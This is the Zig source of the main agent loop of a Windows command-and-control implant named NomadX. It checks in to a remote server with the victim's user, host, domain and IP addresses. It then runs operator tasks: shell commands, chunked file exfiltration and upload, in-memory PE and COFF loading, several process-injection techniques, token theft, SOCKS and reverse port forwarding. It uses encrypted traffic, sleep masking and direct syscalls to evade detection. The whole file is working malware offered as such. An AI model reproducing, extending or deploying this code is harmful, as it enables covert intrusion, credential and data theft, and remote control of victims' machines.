const std = @import("std");
const obf = @import("obf.zig");
const alloc = @import("alloc.zig");
const config = @import("config.zig");
const crypto = @import("crypto.zig");
const http = @import("http.zig");
const jsonutil = @import("jsonutil.zig");
const commands = @import("commands.zig");
const sysinfo = @import("sysinfo.zig");
const win = @import("win32.zig");
const socks = @import("socks.zig");
const rpfwd = @import("rpfwd.zig");
const injection = @import("inject.zig");
const sleep = @import("sleep.zig");
const guardrails = @import("guardrails.zig");
const syscalls = @import("syscalls.zig");

const base64 = std.base64.standard;

const NxAgent = struct {
    cfg: config.NxConfig,
    endpoint: http.NxEndpoint,
    key: [crypto.NX_KEY_LEN]u8,
    uuid_buf: [64]u8 = undefined,
    uuid_len: usize = 0,
    interval: u32,
    jitter: u32,
    sleep_mask: []const u8,
    running: bool = true,

    fn nx_init(allocator: std.mem.Allocator) !NxAgent {
        const cfg = try config.nx_load(allocator);
        injection.nx_configure(cfg);
        const key = try crypto.nx_parse_hex_key(cfg.aes_key_hex);
        const endpoint = try http.nx_endpoint_from_config(allocator, cfg);
        var agent = NxAgent{
            .cfg = cfg,
            .endpoint = endpoint,
            .key = key,
            .interval = cfg.callback_interval,
            .jitter = cfg.callback_jitter,
            .sleep_mask = cfg.sleep_mask,
        };
        const uuid_len = @min(cfg.uuid.len, agent.uuid_buf.len);
        @memcpy(agent.uuid_buf[0..uuid_len], cfg.uuid[0..uuid_len]);
        agent.uuid_len = uuid_len;
        return agent;
    }

    fn nx_uuid(self: *const NxAgent) []const u8 {
        return self.uuid_buf[0..self.uuid_len];
    }

    fn nx_set_uuid(self: *NxAgent, value: []const u8) void {
        const len = @min(value.len, self.uuid_buf.len);
        @memcpy(self.uuid_buf[0..len], value[0..len]);
        self.uuid_len = len;
    }

    fn nx_send(self: *NxAgent, allocator: std.mem.Allocator, message: std.json.Value) ![]u8 {
        const plain = try jsonutil.nx_stringify(allocator, message);
        const envelope = try crypto.nx_encrypt_message(allocator, self.nx_uuid(), self.key, plain, null);
        const response = try http.nx_post(allocator, self.endpoint, envelope);
        return crypto.nx_decrypt_message(allocator, self.nx_uuid(), self.key, response);
    }

    fn nx_checkin(self: *NxAgent, allocator: std.mem.Allocator) !void {
        var obj = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &obj, "action", "checkin");
        try jsonutil.nx_put_string(allocator, &obj, "uuid", self.nx_uuid());
        try jsonutil.nx_put_string(allocator, &obj, "os", "Windows");
        try jsonutil.nx_put_string(allocator, &obj, "architecture", "x64");
        try jsonutil.nx_put_integer(allocator, &obj, "pid", sysinfo.nx_current_pid());
        try jsonutil.nx_put_string(allocator, &obj, "user", try sysinfo.nx_username(allocator));
        try jsonutil.nx_put_string(allocator, &obj, "host", try sysinfo.nx_hostname(allocator));
        try jsonutil.nx_put_string(allocator, &obj, "domain", try sysinfo.nx_domain(allocator));
        try jsonutil.nx_put_integer(allocator, &obj, "integrity_level", sysinfo.nx_integrity_level());

        var ips = jsonutil.nx_init_array(allocator);
        for (try sysinfo.nx_ipv4_addresses(allocator)) |ip| {
            try ips.append(.{ .string = ip });
        }
        try jsonutil.nx_put_array(allocator, &obj, "ips", ips);

        const reply = try self.nx_send(allocator, .{ .object = obj });
        const parsed = try jsonutil.nx_parse(allocator, reply);
        // The parsed document is owned by the cycle arena.
        const status = jsonutil.nx_get_string(parsed.value, "status") orelse "";
        if (!obf.eq(status, "success"))
            return error.CheckinRejected;
        if (jsonutil.nx_get_string(parsed.value, "id")) |new_id| {
            if (new_id.len > 0) self.nx_set_uuid(new_id);
        }
    }

    fn nx_get_tasks(self: *NxAgent, allocator: std.mem.Allocator) ![]NxTask {
        socks.nx_poll();
        rpfwd.nx_poll();

        var obj = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &obj, "action", "get_tasking");
        try jsonutil.nx_put_integer(allocator, &obj, "tasking_size", -1);
        try socks.nx_append_to_request(allocator, &obj);
        try rpfwd.nx_append_to_request(allocator, &obj);
        const reply = try self.nx_send(allocator, .{ .object = obj });
        const parsed = try jsonutil.nx_parse(allocator, reply);
        socks.nx_handle_response(allocator, parsed.value);
        rpfwd.nx_handle_response(allocator, parsed.value);
        const raw_tasks = jsonutil.nx_get_array(parsed.value, "tasks") orelse return &.{};

        var tasks: std.ArrayList(NxTask) = .empty;
        for (raw_tasks) |raw_task| {
            if (raw_task != .object) continue;
            const id = jsonutil.nx_get_string(raw_task, "id") orelse continue;
            const command = jsonutil.nx_get_string(raw_task, "command") orelse continue;
            const parameters = jsonutil.nx_get_string(raw_task, "parameters") orelse "";
            try tasks.append(allocator, .{
                .id = id,
                .command = command,
                .parameters = parameters,
            });
        }
        return tasks.toOwnedSlice(allocator);
    }

    fn nx_post_response(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        task_id: []const u8,
        output: []const u8,
        completed: bool,
        status: []const u8,
    ) !void {
        var response_obj = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &response_obj, "task_id", task_id);
        try jsonutil.nx_put_string(allocator, &response_obj, "user_output", output);
        try jsonutil.nx_put_bool(allocator, &response_obj, "completed", completed);
        try jsonutil.nx_put_string(allocator, &response_obj, "status", status);

        var responses = jsonutil.nx_init_array(allocator);
        try responses.append(.{ .object = response_obj });

        var obj = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &obj, "action", "post_response");
        try jsonutil.nx_put_array(allocator, &obj, "responses", responses);
        const reply = self.nx_send(allocator, .{ .object = obj }) catch return;
        const parsed = jsonutil.nx_parse(allocator, reply) catch return;
        socks.nx_handle_response(allocator, parsed.value);
        rpfwd.nx_handle_response(allocator, parsed.value);
    }

    fn nx_post_response_item(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        item: std.json.Value,
    ) !std.json.Value {
        var responses = jsonutil.nx_init_array(allocator);
        try responses.append(item);

        var obj = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &obj, "action", "post_response");
        try jsonutil.nx_put_array(allocator, &obj, "responses", responses);

        const reply = try self.nx_send(allocator, .{ .object = obj });
        const parsed = try jsonutil.nx_parse(allocator, reply);
        return parsed.value;
    }

    fn nx_register_download(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        task_id: []const u8,
        total_chunks: u64,
        filename: []const u8,
        full_path: []const u8,
    ) ![]const u8 {
        var download = jsonutil.nx_init_object();
        try jsonutil.nx_put_integer(allocator, &download, "total_chunks", @intCast(total_chunks));
        try jsonutil.nx_put_integer(allocator, &download, "chunk_size", 512_000);
        try jsonutil.nx_put_string(allocator, &download, "filename", filename);
        try jsonutil.nx_put_string(allocator, &download, "full_path", full_path);
        try jsonutil.nx_put_string(allocator, &download, "host", "");
        try jsonutil.nx_put_bool(allocator, &download, "is_screenshot", false);

        var item = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &item, "task_id", task_id);
        try jsonutil.nx_put_object(allocator, &item, "download", download);
        try jsonutil.nx_put_bool(allocator, &item, "completed", false);

        const reply = try self.nx_post_response_item(allocator, .{ .object = item });
        return nx_find_file_id(reply) orelse error.DownloadRegisterFailed;
    }

    fn nx_send_download_chunk(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        task_id: []const u8,
        file_id: []const u8,
        chunk_num: u64,
        data: []const u8,
    ) !void {
        const encoded = try nx_base64_encode(allocator, data);
        var download = jsonutil.nx_init_object();
        try jsonutil.nx_put_integer(allocator, &download, "chunk_num", @intCast(chunk_num));
        try jsonutil.nx_put_string(allocator, &download, "chunk_data", encoded);
        try jsonutil.nx_put_string(allocator, &download, "file_id", file_id);

        var item = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &item, "task_id", task_id);
        try jsonutil.nx_put_object(allocator, &item, "download", download);
        try jsonutil.nx_put_bool(allocator, &item, "completed", false);

        const reply = try self.nx_post_response_item(allocator, .{ .object = item });
        if (nx_first_response(reply) == null) return error.DownloadChunkFailed;
        if (nx_response_error(reply) != null) return error.DownloadChunkFailed;
    }

    fn nx_request_upload_chunk(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        task_id: []const u8,
        file_id: []const u8,
        chunk_num: u64,
    ) !std.json.Value {
        var upload = jsonutil.nx_init_object();
        try jsonutil.nx_put_integer(allocator, &upload, "chunk_size", 512_000);
        try jsonutil.nx_put_string(allocator, &upload, "file_id", file_id);
        try jsonutil.nx_put_integer(allocator, &upload, "chunk_num", @intCast(chunk_num));
        try jsonutil.nx_put_string(allocator, &upload, "full_path", "");

        var item = jsonutil.nx_init_object();
        try jsonutil.nx_put_string(allocator, &item, "task_id", task_id);
        try jsonutil.nx_put_object(allocator, &item, "upload", upload);

        return self.nx_post_response_item(allocator, .{ .object = item });
    }

    fn nx_download_task(self: *NxAgent, allocator: std.mem.Allocator, task: NxTask) ![]u8 {
        const path = nx_param_value(allocator, task.parameters, "path") orelse "";
        if (path.len == 0) return allocator.dupe(u8, "No path specified");

        const wide_path = try std.unicode.utf8ToUtf16LeAllocZ(allocator, path);
        const handle = win.CreateFileW(
            wide_path.ptr,
            win.GENERIC_READ,
            win.FILE_SHARE_READ,
            null,
            win.OPEN_EXISTING,
            win.FILE_ATTRIBUTE_NORMAL,
            null,
        );
        if (handle == win.INVALID_HANDLE_VALUE)
            return allocator.dupe(u8, "Failed to open file");
        defer _ = win.CloseHandle(handle);

        var size: i64 = 0;
        if (!win.GetFileSizeEx(handle, &size).toBool() or size < 0)
            return allocator.dupe(u8, "Failed to get file size");

        const chunk_size: usize = 512_000;
        const size_u: u64 = @intCast(size);
        const total_chunks: u64 = if (size_u == 0) 0 else (size_u + chunk_size - 1) / chunk_size;
        const filename = nx_basename(path);
        const file_id = self.nx_register_download(allocator, task.id, total_chunks, filename, path) catch
            return allocator.dupe(u8, "Failed to register download");

        const buffer = try allocator.alloc(u8, chunk_size);
        var chunk_num: u64 = 1;
        var total_read: u64 = 0;
        while (chunk_num <= total_chunks) : (chunk_num += 1) {
            const remaining = size_u - total_read;
            const want: usize = @intCast(@min(remaining, chunk_size));
            var read: win.DWORD = 0;
            if (!win.ReadFile(handle, buffer.ptr, @intCast(want), &read, null).toBool())
                return std.fmt.allocPrint(
                    allocator,
                    "Download failed at chunk {d}/{d} after {d} bytes",
                    .{ chunk_num, total_chunks, total_read },
                );
            if (@as(usize, read) != want)
                return std.fmt.allocPrint(
                    allocator,
                    "Short read: sent {d}/{d} bytes",
                    .{ total_read + @as(u64, read), size_u },
                );
            self.nx_send_download_chunk(allocator, task.id, file_id, chunk_num, buffer[0..read]) catch
                return std.fmt.allocPrint(
                    allocator,
                    "Download failed at chunk {d}/{d} after {d} bytes",
                    .{ chunk_num, total_chunks, total_read },
                );
            total_read += read;
        }

        if (total_read != size_u)
            return std.fmt.allocPrint(allocator, "Short read: sent {d}/{d} bytes", .{ total_read, size_u });
        return std.fmt.allocPrint(allocator, "Downloaded {d} bytes as {s}", .{ total_read, filename });
    }

    fn nx_upload_task(self: *NxAgent, allocator: std.mem.Allocator, task: NxTask) ![]u8 {
        const file_id = nx_param_value(allocator, task.parameters, "file_id") orelse "";
        if (file_id.len == 0) return allocator.dupe(u8, "No file_id specified");

        const file_name_arg = nx_param_value(allocator, task.parameters, "file_name") orelse "";
        const file_name = if (file_name_arg.len > 0) file_name_arg else "upload.bin";
        var remote_path = nx_param_value(allocator, task.parameters, "remote_path") orelse "";
        if (remote_path.len == 0) remote_path = file_name;

        if (nx_ends_with_slash(remote_path) or (try nx_is_directory(allocator, remote_path))) {
            remote_path = try nx_join_path(allocator, remote_path, file_name);
        }

        const wide_path = try std.unicode.utf8ToUtf16LeAllocZ(allocator, remote_path);
        const handle = win.CreateFileW(
            wide_path.ptr,
            win.GENERIC_WRITE,
            0,
            null,
            win.CREATE_ALWAYS,
            win.FILE_ATTRIBUTE_NORMAL,
            null,
        );
        if (handle == win.INVALID_HANDLE_VALUE)
            return allocator.dupe(u8, "Failed to create file");
        defer _ = win.CloseHandle(handle);

        var chunk_num: u64 = 1;
        var total_chunks: u64 = 1;
        var total_written: u64 = 0;
        while (chunk_num <= total_chunks) : (chunk_num += 1) {
            const reply = try self.nx_request_upload_chunk(allocator, task.id, file_id, chunk_num);
            const first = nx_upload_response(reply) orelse
                return allocator.dupe(u8, "Upload response missing");
            if (nx_response_error(reply)) |err|
                return std.fmt.allocPrint(allocator, "Upload failed: {s}", .{err});
            const chunk_b64 = jsonutil.nx_get_string(first, "chunk_data") orelse
                return allocator.dupe(u8, "Upload response missing chunk_data");
            const data = try nx_base64_decode(allocator, chunk_b64);
            const reported_chunks = jsonutil.nx_get_integer(first, "total_chunks") orelse 1;
            total_chunks = if (reported_chunks < 1) 1 else @intCast(reported_chunks);

            if (data.len > 0) {
                var written: win.DWORD = 0;
                if (!win.WriteFile(handle, data.ptr, @intCast(data.len), &written, null).toBool())
                    return allocator.dupe(u8, "Failed to write file");
                if (@as(usize, written) != data.len)
                    return allocator.dupe(u8, "Short write");
                total_written += written;
            }
        }
        return std.fmt.allocPrint(allocator, "Uploaded {d} bytes to {s}", .{ total_written, remote_path });
    }

    fn nx_fetch_file_bytes(
        self: *NxAgent,
        allocator: std.mem.Allocator,
        task_id: []const u8,
        file_id: []const u8,
    ) ![]u8 {
        var output: std.ArrayList(u8) = .empty;
        errdefer output.deinit(allocator);
        var chunk_num: u64 = 1;
        var total_chunks: u64 = 1;
        while (chunk_num <= total_chunks) : (chunk_num += 1) {
            const reply = try self.nx_request_upload_chunk(allocator, task_id, file_id, chunk_num);
            const first = nx_upload_response(reply) orelse return error.UploadResponseMissing;
            if (nx_response_error(reply) != null) return error.UploadFailed;
            const chunk_b64 = jsonutil.nx_get_string(first, "chunk_data") orelse
                return error.UploadChunkMissing;
            const data = try nx_base64_decode(allocator, chunk_b64);
            const reported = jsonutil.nx_get_integer(first, "total_chunks") orelse 1;
            total_chunks = if (reported < 1) 1 else @intCast(reported);
            try output.appendSlice(allocator, data);
        }
        return output.toOwnedSlice(allocator);
    }

    fn nx_execute_pe_task(self: *NxAgent, allocator: std.mem.Allocator, task: NxTask) ![]u8 {
        const file_id = nx_param_value(allocator, task.parameters, "file_id") orelse "";
        const file_name = nx_param_value(allocator, task.parameters, "file_name") orelse "";
        const export_name = nx_param_value(allocator, task.parameters, "export") orelse "";
        const arguments = nx_param_value(allocator, task.parameters, "arguments") orelse "";
        if (file_id.len == 0 and file_name.len == 0)
            return allocator.dupe(u8, "No PE file provided");

        var data = commands.nx_cached_file_data(file_id, file_name);
        if (data == null) {
            if (file_id.len == 0)
                return allocator.dupe(u8, "PE is not cached; upload it with execute_pe first");
            const fetched = self.nx_fetch_file_bytes(allocator, task.id, file_id) catch |err|
                return std.fmt.allocPrint(allocator, "Failed to download PE: {s}", .{@errorName(err)});
            commands.nx_cache_downloaded_file(allocator, file_id, file_name, fetched) catch |err|
                return std.fmt.allocPrint(allocator, "Failed to cache PE: {s}", .{@errorName(err)});
            data = commands.nx_cached_file_data(file_id, file_name);
        }
        const pe_bytes = data orelse return allocator.dupe(u8, "PE file is empty");
        return injection.nx_load_pe(allocator, pe_bytes, export_name, arguments);
    }

    fn nx_dispatch(self: *NxAgent, allocator: std.mem.Allocator, task: NxTask, status: *[]const u8) ![]u8 {
        status.* = "completed";
        if (obf.eq(task.command, "shell")) {
            const command = nx_param_value(allocator, task.parameters, "command") orelse task.parameters;
            return commands.nx_shell(allocator, command);
        }
        if (obf.eq(task.command, "pwd")) return commands.nx_pwd(allocator, task.parameters);
        if (obf.eq(task.command, "cd")) return commands.nx_cd(allocator, task.parameters);
        if (obf.eq(task.command, "ls")) return commands.nx_ls(allocator, task.parameters);
        if (obf.eq(task.command, "cat")) return commands.nx_cat(allocator, task.parameters);
        if (obf.eq(task.command, "cp")) return commands.nx_copy(allocator, task.parameters);
        if (obf.eq(task.command, "mv")) return commands.nx_move(allocator, task.parameters);
        if (obf.eq(task.command, "rm")) return commands.nx_remove(allocator, task.parameters);
        if (obf.eq(task.command, "mkdir")) return commands.nx_make_dir(allocator, task.parameters);
        if (obf.eq(task.command, "download")) return self.nx_download_task(allocator, task);
        if (obf.eq(task.command, "upload")) return self.nx_upload_task(allocator, task);
        if (obf.eq(task.command, "register_file")) return commands.nx_register_file(allocator, task.parameters);
        if (obf.eq(task.command, "register_coff")) return commands.nx_register_file(allocator, task.parameters);
        if (obf.eq(task.command, "execute_coff")) return commands.nx_execute_coff(allocator, task.parameters);
        if (obf.eq(task.command, "execute_pe")) return self.nx_execute_pe_task(allocator, task);
        if (obf.eq(task.command, "inject")) return commands.nx_inject(allocator, task.parameters);
        if (obf.eq(task.command, "inject_fiber")) return commands.nx_inject_technique(allocator, task.parameters, "fiber");
        if (obf.eq(task.command, "inject_callback")) return commands.nx_inject_callback(allocator, task.parameters);
        if (obf.eq(task.command, "inject_threadless")) return commands.nx_inject_technique(allocator, task.parameters, "threadless");
        if (obf.eq(task.command, "inject_kct")) return commands.nx_inject_technique(allocator, task.parameters, "kct");
        if (obf.eq(task.command, "inject_poolparty")) return commands.nx_inject_technique(allocator, task.parameters, "poolparty");
        if (obf.eq(task.command, "inject_earlycascade")) return commands.nx_inject_technique(allocator, task.parameters, "earlycascade");
        if (obf.eq(task.command, "inject_module_overload")) return commands.nx_inject_technique(allocator, task.parameters, "module_overload");
        if (obf.eq(task.command, "rportfwd")) return commands.nx_rportfwd(allocator, task.parameters);
        if (obf.eq(task.command, "whoami")) return commands.nx_whoami(allocator, task.parameters);
        if (obf.eq(task.command, "getprivs")) return commands.nx_get_privs(allocator, task.parameters);
        if (obf.eq(task.command, "steal_token")) return commands.nx_steal_token(allocator, task.parameters);
        if (obf.eq(task.command, "rev2self")) return commands.nx_rev2self(allocator, task.parameters);
        if (obf.eq(task.command, "make_token")) return commands.nx_make_token(allocator, task.parameters);
        if (obf.eq(task.command, "token_store")) return commands.nx_token_store_cmd(allocator, task.parameters);
        if (obf.eq(task.command, "blockdlls")) return commands.nx_block_dlls(allocator, task.parameters);
        if (obf.eq(task.command, "ps")) return commands.nx_ps(allocator, task.parameters);
        if (obf.eq(task.command, "sleep")) {
            self.interval = nx_clamp_param(allocator, task.parameters, "interval", 0, 86400, self.interval);
            self.jitter = nx_clamp_param(allocator, task.parameters, "jitter", 0, 100, self.jitter);
            return std.fmt.allocPrint(
                allocator,
                "Sleep updated: interval={d}s jitter={d}%",
                .{ self.interval, self.jitter },
            );
        }
        if (obf.eq(task.command, "exit")) {
            self.running = false;
            return allocator.dupe(u8, "NxAgent exiting");
        }
        status.* = "error";
        return std.fmt.allocPrint(allocator, "Unknown command: {s}", .{task.command});
    }

    fn nx_loop(self: *NxAgent) !void {
        var checkin_try: usize = 0;
        while (checkin_try < 6) : (checkin_try += 1) {
            var arena = std.heap.ArenaAllocator.init(alloc.nx_page_allocator);
            defer arena.deinit();
            const allocator = arena.allocator();
            self.nx_checkin(allocator) catch {
                sysinfo.nx_sleep_plain(5_000);
                continue;
            };
            break;
        }
        if (checkin_try >= 6) return error.CheckinFailed;

        while (self.running) {
            if (sysinfo.nx_kill_date_reached(self.cfg.kill_date)) break;
            if (socks.nx_has_active() or rpfwd.nx_has_active()) {
                sysinfo.nx_sleep_plain(200);
            } else {
                const sleep_ms = sysinfo.nx_jittered_ms(self.interval, self.jitter);
                sleep.nx_sleep(sleep_ms, self.sleep_mask);
            }

            var arena = std.heap.ArenaAllocator.init(alloc.nx_page_allocator);
            defer arena.deinit();
            const allocator = arena.allocator();

            const tasks = self.nx_get_tasks(allocator) catch continue;
            for (tasks) |task| {
                if (!self.running) break;
                var status: []const u8 = "completed";
                const output = self.nx_dispatch(allocator, task, &status) catch |err| blk: {
                    status = "error";
                    break :blk std.fmt.allocPrint(allocator, "NomadX Zig task error: {s}", .{@errorName(err)}) catch "NomadX Zig task error";
                };
                self.nx_post_response(allocator, task.id, output, true, status) catch {};
            }
        }
    }
};

fn nx_first_response(value: std.json.Value) ?std.json.Value {
    const responses = jsonutil.nx_get_array(value, "responses") orelse return null;
    if (responses.len == 0) return null;
    return responses[0];
}

fn nx_find_file_id(value: std.json.Value) ?[]const u8 {
    if (jsonutil.nx_get_string(value, "file_id")) |id| {
        if (id.len > 0) return id;
    }
    const first = nx_first_response(value) orelse return null;
    if (jsonutil.nx_get_string(first, "file_id")) |id| {
        if (id.len > 0) return id;
    }
    if (jsonutil.nx_get_object(first, "download")) |download| {
        if (jsonutil.nx_get_string(download, "file_id")) |id| {
            if (id.len > 0) return id;
        }
    }
    return null;
}

fn nx_response_error(value: std.json.Value) ?[]const u8 {
    const first = nx_first_response(value) orelse return null;
    if (jsonutil.nx_get_string(first, "error")) |err| {
        if (err.len > 0) return err;
    }
    if (jsonutil.nx_get_string(first, "status")) |status| {
        if (obf.eq(status, "error")) return status;
    }
    return null;
}

fn nx_upload_response(value: std.json.Value) ?std.json.Value {
    const first = nx_first_response(value) orelse return null;
    if (jsonutil.nx_get_object(first, "upload")) |upload| return upload;
    return first;
}

fn nx_base64_encode(allocator: std.mem.Allocator, data: []const u8) ![]u8 {
    const size = base64.Encoder.calcSize(data.len);
    const encoded = try allocator.alloc(u8, size);
    _ = base64.Encoder.encode(encoded, data);
    return encoded;
}

fn nx_base64_decode(allocator: std.mem.Allocator, text: []const u8) ![]u8 {
    const size = try base64.Decoder.calcSizeForSlice(text);
    const decoded = try allocator.alloc(u8, size);
    try base64.Decoder.decode(decoded, text);
    return decoded;
}

fn nx_basename(path: []const u8) []const u8 {
    if (std.mem.lastIndexOfAny(u8, path, "\\/")) |index| return path[index + 1 ..];
    return path;
}

fn nx_ends_with_slash(path: []const u8) bool {
    if (path.len == 0) return false;
    return path[path.len - 1] == '\\' or path[path.len - 1] == '/';
}

fn nx_is_directory(allocator: std.mem.Allocator, path: []const u8) !bool {
    const wide = try std.unicode.utf8ToUtf16LeAllocZ(allocator, path);
    const attributes = win.GetFileAttributesW(wide.ptr);
    return attributes != win.INVALID_FILE_ATTRIBUTES and
        (attributes & win.FILE_ATTRIBUTE_DIRECTORY) != 0;
}

fn nx_join_path(allocator: std.mem.Allocator, directory: []const u8, name: []const u8) ![]u8 {
    var end = directory.len;
    while (end > 0) : (end -= 1) {
        const c = directory[end - 1];
        if (c != '\\' and c != '/') break;
    }
    if (end == 0) return allocator.dupe(u8, name);
    return std.fmt.allocPrint(allocator, "{s}\\{s}", .{ directory[0..end], name });
}

const NxTask = struct {
    id: []const u8,
    command: []const u8,
    parameters: []const u8,
};

fn nx_param_value(allocator: std.mem.Allocator, params: []const u8, key: []const u8) ?[]const u8 {
    if (params.len == 0) return null;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, params, .{}) catch return null;
    return jsonutil.nx_get_string(parsed.value, key);
}

fn nx_clamp_param(
    allocator: std.mem.Allocator,
    params: []const u8,
    key: []const u8,
    min: u32,
    max: u32,
    default: u32,
) u32 {
    if (params.len == 0) return default;
    const parsed = std.json.parseFromSlice(std.json.Value, allocator, params, .{}) catch return default;
    if (parsed.value != .object) return default;
    const item = parsed.value.object.get(key) orelse return default;
    const value: i64 = switch (item) {
        .integer => |n| n,
        .string => |text| std.fmt.parseInt(i64, text, 10) catch return default,
        else => return default,
    };
    if (value < 0) return min;
    if (value > max) return max;
    const clamped: u32 = @intCast(value);
    return @max(clamped, min);
}

pub fn nx_run() !void {
    const allocator = alloc.nx_page_allocator;
    var agent = try NxAgent.nx_init(allocator);
    syscalls.nx_init(agent.cfg.use_direct_syscalls, agent.cfg.syscall_mode);
    if (!guardrails.nx_run(agent.cfg)) return;
    try agent.nx_loop();
}

pub fn nx_start() void {
    nx_run() catch {};
}
